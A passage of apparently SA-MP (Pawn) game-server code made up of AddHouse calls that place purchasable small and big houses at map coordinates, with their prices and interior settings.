	AddHouse(958, -830.605895, 1588.987304, 26.999864, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 959); //A small house ;)
	AddHouse(959, -828.877380, 1604.148559, 27.117187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 960); //A small house ;)
	AddHouse(960, -821.016723, 1603.813354, 27.124444, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 961); //A small house ;)
	AddHouse(961, -800.331359, 1596.550415, 27.068689, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 962); //A small house ;)
	AddHouse(962, -792.039428, 1627.985351, 27.156250, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 963); //A small house ;)
	AddHouse(963, -766.388000, 1613.785400, 27.117187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 964); //A small house ;)
	AddHouse(964, -745.773681, 1590.353515, 26.982727, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 965); //A small house ;)
	AddHouse(965, -788.550354, 1519.825073, 26.923887, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 966); //A small house ;)
	AddHouse(966, -797.972839, 1525.950927, 27.083957, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 967); //A small house ;)
	AddHouse(967, -818.190429, 1569.236328, 27.117187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 968); //A small house ;)
	AddHouse(968, -818.194152, 1560.448852, 27.117187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 969); //A small house ;)
	AddHouse(969, -818.185119, 1551.051513, 27.117187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 970); //A small house ;)
	AddHouse(970, -742.969360, 1431.950561, 16.078781, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 971); //A small house ;)
	AddHouse(971, -715.519409, 1438.803344, 18.887119, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 972); //A small house ;)
	AddHouse(972, -690.064880, 1444.276123, 17.808994, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 973); //A small house ;)
	AddHouse(973, -658.478088, 1446.947875, 13.734240, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 974); //A small house ;)
	AddHouse(974, -650.353027, 1450.457763, 13.679553, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 975); //A small house ;)
	AddHouse(975, -636.452087, 1446.672607, 13.996495, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 976); //A small house ;)
	AddHouse(976, -431.101074, 2241.005615, 42.983383, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 977); //A small house ;)
	AddHouse(977, -451.151031, 2228.566406, 42.429687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 978); //A small house ;)
	AddHouse(978, -403.416320, 2258.798339, 42.429687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 979); //A small house ;)
	AddHouse(979, -413.631072, 2228.705322, 42.425819, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 980); //A small house ;)
	AddHouse(980, -393.174987, 2246.659179, 42.429687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 981); //A small house ;)
	AddHouse(981, -376.973602, 2242.534423, 42.618461, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 982); //A small house ;)
	AddHouse(982, -356.969116, 2234.915527, 42.484375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 983); //A small house ;)
	AddHouse(983, -375.798400, 2260.290283, 43.061927, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 984); //A small house ;)
	AddHouse(984, -361.752532, 2222.274414, 43.007812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 985); //A small house ;)
	AddHouse(985, -384.846710, 2206.305175, 42.423534, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 986); //A small house ;)
	AddHouse(986, -386.690979, 2217.297363, 42.429687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 987); //A small house ;)
	AddHouse(987, -389.980163, 2230.760986, 42.429687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 988); //A small house ;)
	AddHouse(988, -367.375000, 2207.065185, 42.484375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 989); //A small house ;)
	AddHouse(989, -438.526702, 2228.746826, 42.429687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 990); //A small house ;)
	AddHouse(990, -150.006164, 2687.861083, 62.429687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 991); //A small house ;)
	AddHouse(991, -168.585266, 2707.324951, 62.535842, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 992); //A small house ;)
	AddHouse(992, -161.458236, 2728.121093, 62.207557, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 993); //A small house ;)
	AddHouse(993, -155.371353, 2759.200927, 62.773303, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 994); //A small house ;)
	AddHouse(994, -165.934402, 2763.656005, 62.773303, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 995); //A small house ;)
	AddHouse(995, -201.639938, 2771.861572, 62.345779, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 996); //A small house ;)
	AddHouse(996, -232.218399, 2807.716552, 62.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 997); //A small house ;)
	AddHouse(997, -258.001708, 2782.953369, 62.687500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 998); //A small house ;)
	AddHouse(998, -269.716949, 2769.574707, 61.840240, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 999); //A small house ;)
	AddHouse(999, -287.632019, 2758.165283, 62.512119, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1000); //A small house ;)
	AddHouse(1000, -275.310272, 2736.384521, 62.754306, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1001); //A small house ;)
	AddHouse(1001, -311.322570, 2726.859375, 63.072341, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1002); //A small house ;)
	AddHouse(1002, -279.234893, 2721.864746, 62.790626, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1003); //A small house ;)
	AddHouse(1003, -219.821456, 2766.907470, 62.687500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1004); //A small house ;)
	AddHouse(1004, -208.057846, 2713.086669, 62.979370, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1005); //A small house ;)
	AddHouse(1005, -255.145538, 2603.223388, 62.858154, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1006);//Big house
	AddHouse(1006, -910.908325, 2685.971923, 42.370262, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1007); //A small house ;)
	AddHouse(1007, -1478.604492, 2547.398193, 56.254306, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1008); //A small house ;)
	AddHouse(1008, -1476.108520, 2563.298828, 56.176181, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1009); //A small house ;)
	AddHouse(1009, -1449.977661, 2562.321044, 56.023303, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1010); //A small house ;)
	AddHouse(1010, -1446.737548, 2637.256591, 56.254306, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1011); //A small house ;)
	AddHouse(1011, -1445.130371, 2653.170410, 56.269931, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1012); //A small house ;)
	AddHouse(1012, -1459.668823, 2653.662353, 55.835937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1013); //A small house ;)
	AddHouse(1013, -1512.450927, 2646.906494, 56.176181, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1014); //A small house ;)
	AddHouse(1014, -1567.977661, 2630.024169, 55.840278, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1015); //A small house ;)
	AddHouse(1015, -1563.578369, 2651.130371, 55.923439, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1016); //A small house ;)
	AddHouse(1016, -1587.024536, 2650.088378, 55.859375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1017); //A small house ;)
	AddHouse(1017, -1604.202270, 2689.573730, 55.285556, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1018); //A small house ;)
	AddHouse(1018, -1589.858276, 2706.500976, 56.176181, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1019); //A small house ;)
	AddHouse(1019, -1577.886962, 2686.849609, 55.835937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1020); //A small house ;)
	AddHouse(1020, -1565.134033, 2712.116455, 55.859375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1021); //A small house ;)
	AddHouse(1021, -1550.438354, 2699.908447, 56.269931, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1022); //A small house ;)
	AddHouse(1022, -1529.764526, 2685.988525, 55.835937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1023); //A small house ;)
	AddHouse(1023, -1511.818969, 2695.881591, 56.072341, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1024); //A small house ;)
	AddHouse(1024, -1491.510375, 2686.023193, 55.859375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1025); //A small house ;)
	AddHouse(1025, -1482.576171, 2702.545410, 56.254306, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1026); //A small house ;)
	AddHouse(1026, -1465.866821, 2692.910888, 56.269931, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1027); //A small house ;)
	AddHouse(1027, -1450.235351, 2690.907470, 56.176181, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1028); //A small house ;)
	AddHouse(1028, -2348.481689, 2423.321289, 7.334020, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1029);//Big house
	AddHouse(1029, -2379.812500, 2444.122558, 10.169355, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1030);//Big house
	AddHouse(1030, -2398.320556, 2409.011474, 8.910413, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1031);//Big house
	AddHouse(1031, -2420.419921, 2406.317626, 13.028110, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1032);//Big house
	AddHouse(1032, -2424.991699, 2448.727539, 13.150636, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1033);//Big house
	AddHouse(1033, -2476.186279, 2449.806152, 17.323022, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1034);//Big house
	AddHouse(1034, -2482.128173, 2406.808349, 17.109375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1035);//Big house
	AddHouse(1035, -2437.409179, 2354.950927, 5.443065, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1036); //A small house ;)
	AddHouse(1036, -2629.942382, 2427.045654, 14.128805, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1037);//Big house
	AddHouse(1037, -2634.996826, 2401.709960, 11.219980, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1038);//Big house
	AddHouse(1038, -2632.551025, 2374.879882, 9.039601, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1039);//Big house
	AddHouse(1039, -2627.324462, 2359.235595, 8.982927, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1040); //A small house ;)
	AddHouse(1040, -2598.490722, 2360.487548, 9.882995, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1041);//Big house
	AddHouse(1041, -2636.325195, 2351.020751, 8.489088, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1042);//Big house
	AddHouse(1042, -2627.473632, 2318.652343, 8.313562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1043);//Big house
	AddHouse(1043, -2627.575927, 2309.895751, 8.314386, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1044);//Big house
	AddHouse(1044, -2627.590332, 2292.036376, 8.314502, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1045);//Big house
	AddHouse(1045, -2627.636962, 2283.296142, 8.314878, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1046);//Big house
	AddHouse(1046, -2523.825439, 2239.295166, 5.398437, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1047); //A small house ;)
	AddHouse(1047, -2552.015380, 2266.418945, 5.475524, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1048); //A small house ;)
	AddHouse(1048, -2582.154541, 2304.273925, 7.002885, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1049);//Big house
	AddHouse(1049, -2791.603515, 218.629608, 7.859375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1050);//Big house
	AddHouse(1050, -2791.737792, 212.002670, 10.054687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1051);//Big house
	AddHouse(1051, -2791.596435, 200.504486, 7.859375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1052);//Big house
	AddHouse(1052, -2792.147705, 194.217376, 10.054687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1053);//Big house
	AddHouse(1053, -2789.194091, 183.713867, 10.062500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1054);//Big house
	AddHouse(1054, -2792.096435, 143.271881, 10.054687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1055);//Big house
	AddHouse(1055, -2791.599365, 130.668518, 7.859375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1056);//Big house
	AddHouse(1056, -2790.247070, 126.825080, 7.201953, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1057);//Big house
	AddHouse(1057, -2786.759277, 119.977058, 10.062500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1058);//Big house
	AddHouse(1058, -2793.145507, 111.053153, 7.187500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1059);//Big house
	AddHouse(1059, -2792.077148, 104.642814, 10.054687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1060);//Big house
	AddHouse(1060, -2791.590087, 91.891410, 7.859375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1061);//Big house
	AddHouse(1061, -2792.849121, 85.090011, 7.624853, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1062);//Big house
	AddHouse(1062, -2792.008056, 77.337768, 10.054687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1063);//Big house
	AddHouse(1063, -2790.859375, 69.746009, 7.201953, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1064);//Big house
	AddHouse(1064, -2787.092529, 62.881408, 10.062500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1065); //A small house ;)
	AddHouse(1065, -2787.957519, 0.319932, 9.683489, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1066); //A small house ;)
	AddHouse(1066, -2793.146484, 10.989160, 7.429264, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1067);//Big house
	AddHouse(1067, -2793.141845, 21.378164, 7.187500, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1068);//Big house
	AddHouse(1068, -2787.107177, -89.536872, 10.062500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1069); //A small house ;)
	AddHouse(1069, -2786.923339, -118.445549, 10.062500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1070); //A small house ;)
	AddHouse(1070, -2787.326171, -175.394653, 10.062500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1071); //A small house ;)
	AddHouse(1071, -2684.586669, -182.502532, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1072); //A small house ;)
	AddHouse(1072, -2727.998046, -184.293777, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1073); //A small house ;)
	AddHouse(1073, -2727.973876, -155.287246, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1074); //A small house ;)
	AddHouse(1074, -2690.821044, -159.842926, 4.335937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1075); //A small house ;)
	AddHouse(1075, -2720.547119, -146.767852, 4.335937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1076);//Big house
	AddHouse(1076, -2722.072265, -120.796287, 4.770585, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1077);//Big house
	AddHouse(1077, -2690.487304, 64.399993, 4.767180, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1078);//Big house
	AddHouse(1078, -2684.407470, -96.626502, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1079); //A small house ;)
	AddHouse(1079, -2727.975341, -98.168144, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1080); //A small house ;)
	AddHouse(1080, -2684.568847, -125.281356, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1081); //A small house ;)
	AddHouse(1081, -2727.962402, -50.766849, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1082); //A small house ;)
	AddHouse(1082, -2689.502441, 75.592613, 7.185616, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1083); //A small house ;)
	AddHouse(1083, -2689.529785, 95.010253, 7.039516, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1084); //A small house ;)
	AddHouse(1084, -2691.946533, 102.490463, 4.335937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1085);//Big house
	AddHouse(1085, -2690.627441, 123.640586, 4.669472, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1086);//Big house
	AddHouse(1086, -2687.877929, 137.268600, 4.342578, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1087);//Big house
	AddHouse(1087, -2684.565429, 129.830245, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1088); //A small house ;)
	AddHouse(1088, -2686.802978, 115.347183, 7.195312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1089); //A small house ;)
	AddHouse(1089, -2689.468017, 56.561500, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1090); //A small house ;)
	AddHouse(1090, -2692.668945, 188.034240, 7.087349, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1097); //A small house ;)
	AddHouse(1091, -2682.823242, 192.802459, 7.195312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1092); //A small house ;)
	AddHouse(1092, -2672.224609, 189.830123, 4.328125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1093); //A small house ;)
	AddHouse(1093, -2662.886474, 189.693984, 4.517284, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1094); //A small house ;)
	AddHouse(1094, -2653.962890, 190.944992, 4.328125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1095); //A small house ;)
	AddHouse(1095, -2640.268554, 168.732177, 7.040006, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1096); //A small house ;)
	AddHouse(1096, -2627.545654, 168.905410, 5.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1097); //A small house ;)
	AddHouse(1097, -2620.830078, 168.750274, 7.140753, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1098); //A small house ;)
	AddHouse(1098, -2618.997070, 67.871772, 4.335937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1099);//Big house
	AddHouse(1099, -2620.275146, 96.694984, 5.000000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1100);//Big house
	AddHouse(1100, -2621.035644, 114.960311, 5.000000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1101);//Big house
	AddHouse(1101, -2623.279785, 131.581680, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1102); //A small house ;)
	AddHouse(1102, -2620.851074, 121.472747, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1103); //A small house ;)
	AddHouse(1103, -2620.498535, 102.862945, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1104); //A small house ;)
	AddHouse(1104, -2625.386962, 78.806068, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1105); //A small house ;)
	AddHouse(1105, -2621.162109, 71.528160, 4.335937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1106); //A small house ;)
	AddHouse(1106, -2618.397460, 57.625270, 4.335937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1107);//Big house
	AddHouse(1107, -2620.949218, -112.366943, 4.342578, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1108);//Big house
	AddHouse(1108, -2619.672119, -127.626396, 4.714922, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1109);//Big house
	AddHouse(1109, -2620.002929, -134.655242, 4.928825, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1110);//Big house
	AddHouse(1110, -2618.995361, -153.656661, 4.335937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1111);//Big house
	AddHouse(1111, -2620.289062, -169.437286, 4.335937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1112);//Big house
	AddHouse(1112, -2620.960205, -198.182067, 4.335937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1113); //A small house ;)
	AddHouse(1113, -2625.842285, -191.100631, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1114); //A small house ;)
	AddHouse(1114, -2620.681884, -185.552078, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1115); //A small house ;)
	AddHouse(1115, -2620.234619, -173.291915, 5.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1116); //A small house ;)
	AddHouse(1116, -2625.673583, -162.225082, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1117); //A small house ;)
	AddHouse(1117, -2620.855957, -147.364151, 7.140008, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1118); //A small house ;)
	AddHouse(1118, -2620.797363, -119.163459, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1119); //A small house ;)
	AddHouse(1119, -2625.687255, -105.196075, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1120); //A small house ;)
	AddHouse(1120, -2623.219482, -99.626075, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1121); //A small house ;)
	AddHouse(1121, -2791.734619, -18.138906, 7.859375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1122);//Big house
	AddHouse(1122, -2791.916748, -42.374202, 10.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1123); //A small house ;)
	AddHouse(1123, -2690.793701, -134.253967, 4.335937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1124); //A small house ;)
	AddHouse(1124, -2722.981933, 22.435813, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1125); //A small house ;)
	AddHouse(1125, -2688.802978, 197.827224, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1126); //A small house ;)
	AddHouse(1126, -2678.171630, 200.464233, 7.195312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1127); //A small house ;)
	AddHouse(1127, -2672.291992, 200.828994, 5.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1128); //A small house ;)
	AddHouse(1128, -2660.143066, 200.372772, 7.195312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1129); //A small house ;)
	AddHouse(1129, -2654.114990, 200.448455, 5.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1130); //A small house ;)
	AddHouse(1130, -2634.901855, 239.394805, 4.563694, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1131); //A small house ;)
	AddHouse(1131, -2630.935058, 252.822662, 7.187500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1132); //A small house ;)
	AddHouse(1132, -2634.610595, 261.112060, 4.760559, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1133); //A small house ;)
	AddHouse(1133, -2632.342773, 274.620422, 4.334766, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1134); //A small house ;)
	AddHouse(1134, -2628.531494, 267.391998, 7.195312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1135); //A small house ;)
	AddHouse(1135, -2357.096435, 579.835693, 24.890625, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1136);//Big house
	AddHouse(1136, -2338.188476, 580.033752, 27.762626, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1137);//Big house
	AddHouse(1137, -2320.102539, 580.031311, 31.071010, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1138);//Big house
	AddHouse(1138, -2301.706787, 579.491149, 34.431625, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1139);//Big house
	AddHouse(1139, -2278.829833, 747.842956, 49.439266, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1140);//Big house
	AddHouse(1140, -2278.833496, 768.000061, 49.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1141);//Big house
	AddHouse(1141, -2278.833740, 787.703979, 49.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1142);//Big house
	AddHouse(1142, -2590.528320, -185.894104, 4.328397, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1143);//Big house
	AddHouse(1143, -2590.529541, -158.629852, 4.328353, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1144);//Big house
	AddHouse(1144, -2590.532226, -105.977203, 4.329521, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1145);//Big house
	AddHouse(1145, -2590.529296, -95.664031, 4.324443, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1146);//Big house
	AddHouse(1146, -2576.598144, -82.900344, 6.644495, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1147);//Big house
	AddHouse(1147, -2558.847900, -79.937637, 10.837760, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1148);//Big house
	AddHouse(1148, -2524.566894, -145.864578, 21.835483, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1149);//Big house
	AddHouse(1149, -2524.327636, -118.726264, 21.793392, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1150);//Big house
	AddHouse(1150, -2541.414794, -145.862503, 15.680644, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1151);//Big house
	AddHouse(1151, -2541.334716, -119.310668, 16.180627, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1152);//Big house
	AddHouse(1152, -2558.798095, -145.860580, 9.410605, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1153);//Big house
	AddHouse(1153, -2558.464111, -118.726776, 11.041642, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1154);//Big house
	AddHouse(1154, -2576.290771, -118.978607, 6.590103, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1155);//Big house
	AddHouse(1155, -2576.750000, -145.721679, 6.643600, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1156);//Big house
	AddHouse(1156, -2576.449462, -198.798416, 6.635194, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1157);//Big house
	AddHouse(1157, -2558.791992, -198.800384, 10.954345, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1158);//Big house
	AddHouse(1158, -2541.329589, -198.798934, 16.267635, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1159);//Big house
	AddHouse(1159, -2524.279785, -198.799407, 21.785406, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1160);//Big house
	AddHouse(1160, -2515.375732, -189.485839, 25.049861, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1161);//Big house
	AddHouse(1161, -2515.377929, -170.958190, 25.049617, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1162);//Big house
	AddHouse(1162, -2515.375976, -154.132141, 25.049835, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1163);//Big house
	AddHouse(1163, -2510.872314, -109.528984, 25.617187, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1164);//Big house
	AddHouse(1164, -2431.211914, -4.718758, 35.320312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1165);//Big house
	AddHouse(1165, -2431.214355, -27.571670, 35.320312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1166);//Big house
	AddHouse(1166, -2372.527343, 595.723937, 27.628881, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1167);//Big house
	AddHouse(1167, -2372.526855, 614.168395, 30.937023, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1168);//Big house
	AddHouse(1168, -2372.526367, 632.615173, 34.259654, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1169);//Big house
	AddHouse(1169, -2372.531982, 644.163879, 35.171875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1170);//Big house
	AddHouse(1170, -2358.312744, 679.962829, 35.164062, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1171);//Big house
	AddHouse(1171, -2358.598632, 656.736816, 35.171875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1172);//Big house
	AddHouse(1172, -2340.128662, 679.957824, 38.388877, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1173);//Big house
	AddHouse(1173, -2340.016601, 656.734619, 38.388156, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1174);//Big house
	AddHouse(1174, -2321.831054, 679.956420, 41.977752, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1175);//Big house
	AddHouse(1175, -2303.406250, 656.736022, 45.332069, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1176);//Big house
	AddHouse(1176, -2303.487548, 679.735961, 45.337650, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1177);//Big house
	AddHouse(1177, -2372.754394, 692.817565, 35.164062, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1178);//Big house
	AddHouse(1178, -2368.823242, 711.853576, 35.173168, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1179);//Big house
	AddHouse(1179, -2368.819091, 740.597534, 35.151679, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1180);//Big house
